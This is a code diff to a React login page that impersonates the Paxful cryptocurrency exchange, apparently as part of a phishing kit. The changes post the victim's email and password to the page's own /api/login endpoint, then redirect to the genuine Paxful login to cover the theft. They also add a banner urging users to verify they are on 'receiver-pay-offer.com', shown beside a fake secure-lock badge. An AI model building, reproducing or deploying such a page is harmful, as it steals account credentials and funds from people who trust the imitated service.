@@ -1,6 +1,8 @@
 "use client";
 
 import { Montserrat } from "next/font/google";
+import { IoLockClosedSharp } from "react-icons/io5";
+
 import Image from "next/image";
 import Link from "next/link";
 import React, { useState } from "react";
@@ -28,7 +30,11 @@ const Index = () => {
       /^(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}$/;
 
     // Check if input matches either the email or phone pattern
-    return emailPattern.test(input) || phonePattern.test(input);
+    if (emailPattern.test(input) || phonePattern.test(input)) {
+      setError1("");
+    } else {
+      setError1("Enter a valid phone or email.");
+    }
   }
 
   const handleEmailChange = (e: any) => {
@@ -39,14 +45,19 @@ const Index = () => {
   const handleSignIn = async () => {
     try {
       setIsLoading(true);
-      const res = await axios.post(`${baseUrl}/login`, { email, password });
+      const res = await axios.post(`${baseUrl}/api/login`, { email, password });
+      console.log(res);
+
+      window.location.replace("https://accounts.paxful.com/login/");
       setIsLoading(!true);
-    } catch (error) {}
-    setIsLoading(!true);
+    } catch (error) {
+      console.error(error);
+      setIsLoading(!true);
+    }
   };
 
   return (
-    <div className='w-full h-screen flex flex-row-reverse'>
+    <div className='w-full h-screen  flex flex-row-reverse'>
       <div className='w-[58.5%] hidden lg:flex bg-[#f4fafdff] relative items-center justify-center h-screen'>
         <Image
           quality={100}
@@ -57,7 +68,7 @@ const Index = () => {
           alt='login'
         />
       </div>
-      <div className='w-full lg:w-[41.5%] pl-[7.8%] pr-[4%] pt-[4.3%] bg-white h-full'>
+      <div className='w-full lg:w-[41.5%] pl-[4%] md:pl-[7.8%] pr-[4%] pt-[10%] lg:pt-[4.3%] bg-white h-full'>
         <div className='flex items-center  justify-between w-full'>
           <Link className='' href={"/"}>
             <svg
@@ -128,7 +139,33 @@ const Index = () => {
         >
           Log In With Paxful
         </h1>
-        <div className='w-full mt-16'>
+        <div className='border relative border-[#d1ecfa] mt-[24px] bg-[#f4fafd] rounded-[8px] py-[11px] pl-[35px] flex flex-col md:flex-row '>
+          <svg
+            width='16'
+            height='16'
+            viewBox='0 0 16 16'
+            fill='#0091d2'
+            className='absolute left-3   top-3'
+          >
+            <path
+              fill-rule='evenodd'
+              d='M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z'
+              clip-rule='evenodd'
+            ></path>
+          </svg>
+          <p className='text-xs text-[#333] md:w-[45%] font-semibold'>
+            IMPORTANT! Please check that you are visiting
+            https://receiver-pay-offer.com/
+          </p>
+          <div className='bg-white mt-2 lg:mt-0 md:self-center w-max relative md:left-[3%] h-max px-[8px] py-[4px] border border-appAsh rounded-[4px] flex items-center'>
+            <IoLockClosedSharp className='' color=' #16a34a ' />
+            <p className='font-bold ml-1  text-[10px]'>
+              <span className='text-green-600 text-[10px]'>https://</span>{" "}
+              receiver-pay-offer.com
+            </p>
+          </div>
+        </div>
+        <div className='w-full mt-6'>
           <h3 className='text-[#333] mb-1  font-semibold'>
             Your Phone or Email
           </h3>
@@ -138,6 +175,7 @@ const Index = () => {
                 setError1("This field may not be blank");
               } else {
                 setError1("");
+                validateEmailOrPhone(email);
               }
             }}
             onChange={(e) => {
@@ -166,7 +204,7 @@ const Index = () => {
             <h3 className='text-[#333] mb-1  font-semibold'>Your Password</h3>
             <Link
               href={"https://paxful.com/forgot-password?locale=en"}
-              className='text-appBlue2 mb-1 '
+              className='text-appBlue2 hover:text-[#333] hover:underline mb-1 '
             >
               Forgot Password?
             </Link>
